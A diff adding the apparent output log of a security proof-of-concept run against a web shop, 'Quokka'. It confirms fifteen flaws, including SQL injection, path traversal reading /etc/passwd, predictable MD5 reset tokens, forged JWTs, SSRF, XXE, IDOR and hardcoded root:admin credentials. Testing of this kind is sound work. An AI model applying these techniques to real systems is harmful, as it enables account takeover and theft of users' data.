@@ -1,0 +1,72 @@
+------------------------------------------------------------
+V1  Mass assignment -> ADMIN account (signup)
+  {"user":{"id":"cmwugi6s2000f7d0gzrkp7d9s","email":"poc-massassign-1795510352@example.com","role":"ADMIN"}}
+
+  [VULNERABLE] signup accepts attacker-controlled role=ADMIN
+------------------------------------------------------------
+V2  SQL injection - /api/products/search (unauthenticated)
+  {"products":[{"id":"cmwugca7500067doyhu3alkho","name":"0571749e2ac330a7455809c6b0e7af90","description":"vis.bruta@example.com","price":"CUSTOMER","imageUrl":"1"},{"id":"cmwugca7600077doyh39a1y3g","name":"94c208158b0c4f7f4dc689acc6dcc581","description":"admin@quokka.store","price":"ADMIN","imageUrl
+  [VULNERABLE] product search SQLi leaks the users table
+------------------------------------------------------------
+V3  SQL injection - /api/tracking via x-forwarded-for (unescaped)
+  (row written to visitor_logs with injected value - see DB)
+  Verify with: sqlite3 $DATABASE_URL 'select ip from visitor_logs where path="/poc"'
+  Expect ip to contain the admin email.
+------------------------------------------------------------
+V4  Unauthenticated arbitrary file read - /api/files (path traversal)
+  {"filename":"../../../../../../etc/passwd","content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/us
+  [VULNERABLE] /api/files reads /etc/passwd without authentication
+  dir listing: {"path":"../","items":[{"name":".dockerignore","type":"file","size":298,"modified":"2026-11-23T20:45:00.285Z"},{"name":".env.local","type":"file","size":94,"mod
+  [VULNERABLE] /api/files lists directories without authentication
+------------------------------------------------------------
+V5  Predictable password-reset token -> admin account takeover
+  predicted token: 19003a36b9053226168e42aa17489d64
+{"message":"Your password has been reset successfully."}
+  [VULNERABLE] reset token is MD5(email+unix_seconds) and was predicted offline
+------------------------------------------------------------
+V6  Privilege escalation - customer mints a support token for the admin
+  {"user":{"id":"cmwugca7600077doyh39a1y3g","email":"admin@quokka.store","role":"ADMIN"}}
+
+  [VULNERABLE] CUSTOMER session escalated to ADMIN via support-access token
+------------------------------------------------------------
+V7  Middleware JWT signature bypass - /monitoring/internal-status
+  http status with forged cookie: 200
+  [VULNERABLE] forged (unsigned) JWT accepted by middleware
+------------------------------------------------------------
+V8  SSRF - /api/support screenshotUrl (unauthenticated, response reflected)
+  {"success":true,"data":{"email":"a@b.com","title":"t","description":"d","screenshotContent":"[{\"id\":\"cmwugca7900087doysw9r0wc6\",\"name\":\"Artisan Sourdough Bread\",\"price\":5.49,\"description\":\"Handcrafted sourdough bread with a c
+  [VULNERABLE] server fetched an internal URL and returned the body
+------------------------------------------------------------
+V9  IDOR - read another user's private wishlist and order
+  {"id":"wl-bob-001","name":"Weekend Groceries","ownerEmail":"bob@example.com","isPublic":false,"createdAt":"2026-11-24T08:47:57.755Z","updatedAt":"2026-11-24T08:47:57.755Z","items":[{"id":"cmwugcapo0
+  [VULNERABLE] CUSTOMER read Bob's private wishlist
+  {"id":"ORD-001","total":23.95,"status":"DELIVERED","customerName":"Bob","customerEmail":"bob@example.com","deliveryAddress":{"street":"Friedrichstraße 123","city":"Berlin","state":"Berlin","zipCode
+  [VULNERABLE] CUSTOMER read Bob's order (address + totals)
+------------------------------------------------------------
+V10 Broadcast hijack - any customer can rewrite the live stream
+  {"ok":true,"message":"Broadcast updated. The public /live page now plays your video.","config":{"id":1,"title":"Quokka Live — Ducks quacking on a river in the forest","liveVideoId":"dQw4w9WgXcQ","rtmpUrl":"rtmp://ingest.quokka.store/live","streamKey":"live
+  [VULNERABLE] non-admin POST persisted to the public stream config
+  [VULNERABLE] response leaks the RTMP ingest stream key
+------------------------------------------------------------
+V11 Unauthenticated order read via forged share token (hardcoded key)
+  {"type":"order","order":{"id":"ORD-001","total":23.95,"status":"DELIVERED","customerName":"Bob","createdAt":"2026-11-24T08:47:57.320Z","items":[{"name":"Artisan Sourdough Bread","quantity":2,"price":5.49},{"name":"Fres
+  [VULNERABLE] share token forged with the hardcoded fallback key
+------------------------------------------------------------
+V12 Stored XSS - unauthenticated review payload
+  [VULNERABLE] raw HTML stored & served (client injects it via innerHTML)
+------------------------------------------------------------
+V13 Coupon price manipulation - cartTotal is client supplied
+  {"discountedTotal":0.005,"discountPercent":50}
+
+  [VULNERABLE] server discounts a client-supplied total
+------------------------------------------------------------
+V14 XXE - /api/admin/suppliers/import-order
+  {"message":"Supplier order imported successfully.","order":{"id":"cmwugi75x000l7d0g0aowp1u4","supplierId":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/
+  [VULNERABLE] external entity resolved - local file read
+------------------------------------------------------------
+V15 Hardcoded SIEM credentials + plaintext passwords in logs
+  GET /api/monitoring/logs with root:admin -> 200
+  [VULNERABLE] login attempts store the plaintext password in a readable log
+------------------------------------------------------------
+SUMMARY: 17 vulnerable checks confirmed, 0 not confirmed
+Artifacts: /tmp/tmp.BcajydFEc5
